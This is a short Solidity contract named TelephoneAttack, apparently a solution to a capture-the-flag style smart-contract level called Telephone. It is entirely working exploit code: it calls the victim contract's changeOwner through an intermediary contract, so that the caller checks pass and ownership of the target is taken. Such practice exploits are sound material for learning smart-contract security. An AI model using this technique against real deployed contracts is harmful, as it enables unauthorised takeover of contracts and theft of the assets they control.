// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'Telephone.sol';

contract TelephoneAttack {

    Telephone victim;
    constructor(address addr) public {
        victim = Telephone(addr);
    }

    function attack(address owner) public {
        victim.changeOwner(owner);
    }

}
